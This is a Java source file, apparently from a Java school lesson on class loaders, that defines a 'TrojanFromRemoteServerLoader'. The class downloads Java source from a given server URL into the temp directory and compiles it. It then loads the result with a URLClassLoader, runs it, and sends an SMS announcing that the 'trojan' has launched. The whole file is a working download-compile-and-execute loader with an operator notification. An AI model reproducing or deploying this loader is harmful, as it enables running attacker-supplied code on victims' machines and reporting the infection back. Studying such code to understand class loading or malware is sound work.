package com.sbt.javaschool.rnd.lesson7trojanloader.loaders;

import com.sbt.javaschool.rnd.lesson7trojanloader.sms.SmsRuSender;
import org.apache.commons.io.FileUtils;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Arrays;
import java.util.Scanner;

public class TrojanFromRemoteServerLoader implements AllLoadersInterface {

    @Override
    public int loadAndRun(String serverURL) {
        return loadJavaFileFromServer(serverURL);
    }
    int loadJavaFileFromServer(String serverURL) {
        try {
            FileUtils.copyURLToFile(new URL(serverURL), new File(System.getProperty("java.io.tmpdir")+"TrojanOnServer.java"));
        } catch(IOException e) {
            e.printStackTrace();
        }
        TrCompiler.compile(System.getProperty("java.io.tmpdir")+"TrojanOnServer.java");
        this.run();
        return 1;
    }
    @Override
    public void run(){
        URLClassLoader urlClassLoader=null;
        try {
            File dir = new File(System.getProperty("java.io.tmpdir"));
            urlClassLoader = new URLClassLoader(new URL[]{dir.toURI().toURL()});
            Class<?> TrojanCl = urlClassLoader.loadClass("com.sbt.javaschool.rnd.lesson7trojanloader.trojans.TrojanOnServer");
            System.out.println("Из " + Arrays.asList(urlClassLoader.getURLs()).get(0).getPath() + " загрузили класс " + TrojanCl.getName() +"\n"+"Classloader name="+urlClassLoader.toString());
            TrojanCl.getDeclaredMethod("run").invoke(TrojanCl.newInstance());
        } catch (Exception e) {
            System.out.println("Не удалось загрузить класс " + "TrojanOnServer" + " из класслоадера " + urlClassLoader.toString());
        }
        SmsRuSender s= new SmsRuSender();
        s.InformAboutLoading("SBS_троян_запущен");
    }


}
